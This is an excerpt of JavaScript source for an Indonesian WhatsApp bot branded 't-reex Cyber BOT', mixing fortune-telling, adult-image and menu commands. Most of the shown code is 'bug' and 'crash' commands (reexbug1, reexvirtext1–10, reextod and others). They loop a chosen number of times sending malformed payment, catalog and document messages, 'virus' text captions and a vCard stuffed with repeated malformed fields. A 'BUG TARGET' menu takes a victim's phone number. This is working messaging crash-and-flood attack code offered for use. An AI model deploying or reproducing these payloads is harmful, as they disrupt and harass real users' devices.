...
// Base ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ Hw Mods : Copyan Dari Base Dika

› Create By ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧
› Base Ori ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ */
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/channel/UCpkP5kroMXEeoHLGX4VUTeA`}}}, { quoted: m })} 
//=================================================//
try {
...
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧",
"options": [
{
...
{
"optionName": "SALAM BROTHER BY ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧"
}
],
...
break
//=================================================//
case 'jadikatalog': case 'reexkatalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
...
break
case 'reextroli3': case 'reextrol2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧`,
}
}}), { userJid: m.chat, quoted: doc})
...
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'reexdaca': case 'reexdaca':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
for (let i = 0; i < jumlah; i++) {
 ...
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'reexdocu': case 'reexdraknes':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case 'reexvirtext1': case 'reexsu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone}` }, { quoted: doc })
}
}
break
case 'reexvirtext2': case 'reextol': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone1}` }, { quoted: doc })
}
}
break
case 'reexvirtext3': case 'reexmemek':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone2}` }, { quoted: doc })
}
}
break
case 'reexvirtext4': case 'reexcontol': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone3}` }, { quoted: doc })
}
}
break
case 'reexvirtext5': case 'reextextv': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone4}` }, { quoted: doc })
}
}
break
case 'reexvirtext6': case 'reexgas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone5}` }, { quoted: doc })
}
}
break
case 'reexvirtext7': case 'reexjuvirtext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${iphone6}` }, { quoted: doc })
}
}
break
case 'reexvirtext8': case 'reexjuvirtext1':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${buttonkal}` }, { quoted: doc })
}
}
break
case 'reexvirtext9': case 'reexjuvirtext2':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${buttonvirus}` }, { quoted: doc })
}
}
break
case 'reexvirtext10': case 'reexjuvirtext3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'reexbug1': case 'reexcrash': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
"mimetype": "image/jpeg",
"caption": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
...
"fileName": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
...
"title": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
...
"description": "Developer ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
...
"inviteExpiration": `MY NAME ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
"groupName": `MY NAME ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
...
"title": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,
"description": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧`,
"currencyCode": "IDR",
"footerText": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ WE ARE NOT MASTOD`,
...
break
//=================================================//
case 'reexstik': case 'reexkangbug': case 'buttonkatian': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'reexbugie': case 'reexkangbug1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} reexmods`
...
break
//=================================================//
case 'reexbutton': case 'reexkangbuttton': 
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${ngazap(prefix)}.BIN`, title: `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'reextod': case 'reexewe': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
haikal.sendContact(m.chat, global.ownerr, fkontaak)
}
}
break
//=================================================//
case 'reexbokep': case 'reexngentod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:reex})
} else if (args[0] === "off") {
...
haikal.sendMessage(m.chat, anuala, `☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
caption: `© ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ ${buttonkal}`,
} 
...
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:reex})
} else if (args[0] === "off") {
...
haikal.sendMessage(m.chat, trapbot, { quoted:reex }).catch(err => {
 return('Error!')
})
break
case 'hentai-neko' :
...
haikal.sendMessage(m.chat, hnekobot, { quoted:reex }).catch(err => {
 return('Error!')
})
break
case 'hentai-waifu' :
...
haikal.sendMessage(m.chat, nwaifubot, { quoted:reex }).catch(err => {
 return('Error!')
})
break
case 'gasm':
...
haikal.sendMessage(m.chat, wbuttsss,{ quoted:reex }).catch(err => {
 return('Error!')
})
break
//=================================================//
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧, 7, 7, 2005, Putri, 16, 11, 2004`
...
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧ Gans`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧, 7, 7, 2005`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧|Putri`
...
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
...
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:reex})
} else if (args[0] === "off") {
...
☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆`, contextInfo:{"externalAdReply": {"title": `SC ☆𝐭-𝐫𝐞𝐞𝐱 𝐂𝐲𝐛𝐞𝐫 𝐁𝐎𝐓☆⏧`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UCpkP5kroMXEeoHLGX4VUTeA`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
...
╠➤𝐚𝐟𝐤 { 𝐤𝐚𝐬𝐢𝐡 𝐫𝐞𝐚𝐜𝐭𝐢𝐨𝐧𝐬 }
╠➤𝐫𝐞𝐞𝐱𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
╠➤𝐫𝐞𝐞𝐱𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
╠➤𝐫𝐞𝐞𝐱𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
...
╔══════[ 𝐁𝐔𝐆 𝐓𝐀𝐑𝐆𝐄𝐓 ]══════⊱
╠➤𝐫𝐞𝐞𝐱𝐬𝐤𝐮𝐲 𝟔𝟐𝟖𝐱𝐱𝐱
